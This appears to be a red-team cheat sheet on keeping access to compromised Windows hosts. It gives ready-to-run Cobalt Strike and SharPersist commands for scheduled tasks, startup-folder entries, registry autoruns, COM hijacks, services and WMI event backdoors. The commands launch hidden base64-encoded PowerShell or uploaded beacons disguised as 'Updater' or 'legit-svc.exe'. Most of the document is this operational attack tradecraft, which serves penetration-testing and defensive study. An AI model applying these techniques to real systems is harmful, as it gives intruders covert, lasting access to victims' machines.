---
layout:     post
author:     0x5c4r3
type: docs
permalink: Persistence
---

<span style="color:red">Host Persistence changes based on User or SYSTEM shells.</span>
&nbsp;
<span style="font-size: 35px; color:red"><b>Host Persistence (User)</b></span>
&nbsp;
<span style="font-size: 25px; color:white"><b>Task Scheduler</b></span>
Like cronojobs in Linux.
From Powershell, encode the payload in base64 to avoid dealing with quotations.
On Windows:
```powershell
$str = '<example_powershell_command_i.e._download_cradle>'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```
On Linux:
```powershell
set str '<example_powershell_command_i.e._download_cradle>'
echo -en $str | iconv -t UTF-16LE | base64 -w 0
```
Then from CobaltStrike:
```powershell
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <encoded_payload_b64>" -n "Updater" -m add -o hourly
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Startup Folder</b></span>
Applications, files and shortcuts within a user's startup folder are launched automatically when they first log in. 
From CobaltStrike:
```powershell
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <encoded_payload_b64>" -f "UserEnvSetup" -m add
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Registry Autorun</b></span>
AutoRun values in HKCU and HKLM allow applications to start on boot. 
From Cobalt Strike:
```powershell
cd C:\ProgramData
upload C:\Payloads\http_x64.exe
mv http_x64.exe updater.exe
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>COM Hijacks</b></span>
<span style="color:red"><b>HKCU and HKLM</b></span>
Finding instances of applications loading objects that for some reason don't exist anymore.
Using [ProcessMonitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from Sysinternals, look for <span style="color:red">RegOpenKey</span> operations where the Result is <span style="color:red">NAME NOT FOUND</span> and the Path ends with <span style="color:red">InprocServer32</span>.
Look for someone that's loaded semi-frequently (i.e. something that loads when a common application is started - Excel, Word, Outlook...).
Check that the entry you've chosen exists in HKLM, but not in HKCU:
```powershell
Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"  <-- this should list the entry
Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"  <-- this should return "Cannot find path..."
```
To exploit this, set HKCU path to the .dll exploit:
```powershell
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "<path_to_dll_exploit>"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
To clean-up a COM hijack, simply remove the registry entries from HKCU and delete the DLL.
&nbsp;

<span style="color:red"><b>Task Scheduler</b></span>
Find tasks that use custom triggers to call COM objects:
```powershell
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```
Then search the task name in the Task Scheduler and check the Status and the Triggers > Details of the tasks listed with the script above.
```powershell
Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
```
Check that the entry you've chosen exists in HKLM, but not in HKCU:
```powershell
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize  <-- this should list the entry
Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"  <-- this should return "Cannot find path..."
```
Add a duplicate entry into HKCU pointing to our DLL (as above), and this will be loaded once every time a user logs in.
&nbsp;

---
&nbsp;
<span style="font-size: 35px; color:red"><b>Host Persistence (SYSTEM)</b></span>
&nbsp;
On High Integrity shells/beacons. DO NOT USE HTTP Beacons as SYSTEM cannot authenticate to web proxies. Use P2P or DNS.
&nbsp;
<span style="font-size: 25px; color:white"><b>Create a Service</b></span>
```powershell
cd C:\Windows
upload C:\Payloads\tcp-local_x64.svc.exe
mv tcp-local_x64.svc.exe legit-svc.exe

execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
```
This creates a STOPPED Service. Once the machine will restart, the service will do the same.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Persistence via WMI events</b></span>
Through EventConsumer, EventFilter, FilterToConsumerBuilding.
[PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) is a PowerShell tool for building WMI events.
```powershell
cd C:\Windows
upload C:\Payloads\dns_x64.exe
powershell-import C:\Tools\PowerLurk.ps1
powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
```
Double check the classes using:
```powershell
Get-WmiEvent -Name WmiBackdoor
```
If you open the process declared on the commands above (<span style="color:red">notepad.exe</span>), <span style="color:red">dns_x64.exe</span> will trigger.

Remove the backdoor with:
```powershell
Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
```
